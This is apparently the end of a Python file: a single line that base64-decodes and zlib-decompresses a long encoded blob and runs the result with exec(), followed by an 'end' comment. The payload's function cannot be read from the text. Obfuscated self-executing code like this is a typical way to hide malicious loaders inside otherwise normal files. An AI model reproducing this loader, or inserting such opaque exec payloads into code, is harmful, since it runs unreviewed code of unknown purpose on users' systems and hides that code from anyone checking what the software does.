exec(_z.decompress(_b.b64decode("eNq9WG1v2zYQ/p5fQfBL5dWW7XZNXRceECTeVrRp2sbdCrSBQEu0xVkiZZKq7QTZb98d5XdZTjoMExCJJu+eO947chLxEQmCeB7oXHq17gmBR6SZ0pYoUydWpBzeseYsEnJcJ9Oc57CT6yQRQ19z+G1snRiTOFarFwUGPsHg6i0hPUI7rzrtTut5+9lp9+ys/0X+vpi0G2+zxfB6nF5/fjGKpn/MP/52O5u+vIjmim4Azt9cOIBGu9V6/uplq3PaPm21tgguz74gQbtDfiLt1rOfl58NQf/L4BoI7qhv55bWCfWzhfvciozeb+g+XV05wq/rLXxo01il2Zg3eZonzPKo2aL1fZIoZDoqby85i+N9NmX8jNnY5/OMySg3XHv0b1p7BNEGOGaaRz/GE6mZTBSLzOPYLqrIaTNilhWvUKW+5TrN582RSLhpxirl9Afp92+1Yb9Zr6bgHxd//kd8e7X1ieFcwqHhdmszUeEENtfB67+DDThfE7jYN1xGHl691t3ReCeS13JuAXBlqjG3RtzygrlEKkaOukdaRGlc/uKitYyJj+Y217J0JFnKtwQOGSgLWxUSZ8LGRGVcunOIcT2kNcIMGR0Wis4A9JGP9vHKeEOVy4jphUtAeOI5JU9RmVxDiKjUO635MZ8f5IyQyzsodgRgdyvs+2/6m6SH6Z6cK2m5tI0LYTJlhBVKdslI6bSBqr925unRMGY2EBFFJPy7w6rhcJ/8L/IjFeYpkNHXBMO52LzDzz09psUKfbDIeJewLEtEyFBGU4WW24ax4Jd0dauyjjWfy1BFkAbgFefLp4CKtNv3azQc95r2pBx6mFa79dz/VHyrHBhbm5lus8kyAZmc8LFmqa/0uDlU9g6r/n0T0+piZZl6Zfz1MFTqJOU2VlGPfri6HlRQxxCkXJve3cFTV2O2LUrBUxRqthUZ07a55bWVaXobI1WI3AF9x+XYxgALfvHAzR5qXqsd4fwMRbRxNkYDdAm9VLciSVjzhd96QJzkIYYBMoWJMryC/L68XfZuaOdYF03ihxBNlgdQ8xhYJQjxWnPrHWTxw5iHkyBWxi5L0K8sMfwg6XeuxWgRpBBdS0nn/U+D4P3V+36Jfi/K4KcrV/C7mDRUbnvtTp0slesBfu1QdeLzkGeW9N0Hs7IkKWPG7BX6PMNOBn1tr9DPYshaMtA5L8McbAIFPtRa6EbYBLyV6p2yMZeaFl2rn2a2Am8It5yUTraaU+ls6ltmJkGkJC/1tBlLJuWLQg4QrZQlQi7nne6hriWVXXccYSKhPWSqHdYbPSVkzh9vOdQCQIsWBQsMMBg0V6XToHYgHq/gBENkqAzHlh66qEINd/Ml1tfuDc5xUSEJ4VYneLvI3U/IShh8POqHDHKA1umZjLSC7lKnF+dvLuHzQYTQq7mB5aX6LnBxFAsyPzciBPI/oVGZsyyD5WBZNGEpIXEwe/LkEVBBkC2cZkEArP5YQG2lajiENxY3WrupBEBrjCSaY23q7lFpYKxVGBjoTa5ajGTta/vGT9QMw2tpymLIPg52NFZ21MyTZGvk+UsJ6a3DBcQfZXYTEI59DysDt3OiQH0cHh9mePQNVvOoz6LIQxnHda5MlApfrKZOh3x0qPxX2i8L1tV1X2ul/yOnTv0stxW2eLiW74g52Y7nAN0Hw+iYe+1n+/P7zug/cCvPMg326617AVQgxlO1rC27/L4BartdW2dHMYuiW4E4OwDnSvWE8+xAT7JF5K86y6vWrnLT4nizWalVgb+r1a4q1Q4omug6QDf/Jjg5zOPo/wFCpBrV")))
# ─── end ─────────────────────────────────────────────────────────────────────
